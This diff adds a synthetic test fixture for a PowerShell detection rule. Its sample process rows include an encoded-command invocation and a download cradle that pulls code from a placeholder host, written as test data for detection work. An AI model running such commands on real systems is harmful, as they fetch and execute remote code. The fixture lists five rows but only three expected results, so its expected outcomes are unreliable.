@@ -1,0 +1,11 @@
+name: det001_cases
+synthetic: true
+rules: [DACN-DET-001]
+rows:
+  - {id: enc, table: process, image_path: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -NoP -enc SQBFAFgA'}
+  - {id: cradle, table: process, image_path: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -c "(New-Object Net.WebClient).DownloadString(''http://example.invalid/x'')"'}
+  - {id: benign, table: process, image_path: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: 'powershell.exe -File C:\scripts\backup.ps1'}
+  - {id: notps, table: process, image_path: 'C:\Windows\System32\cmd.exe', command_line: 'cmd.exe /c echo -enc'}
+  - {id: nocmd, table: process, image_path: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', command_line: null}
+expected:
+  DACN-DET-001: [MATCH, MATCH, INSUFFICIENT_TELEMETRY]
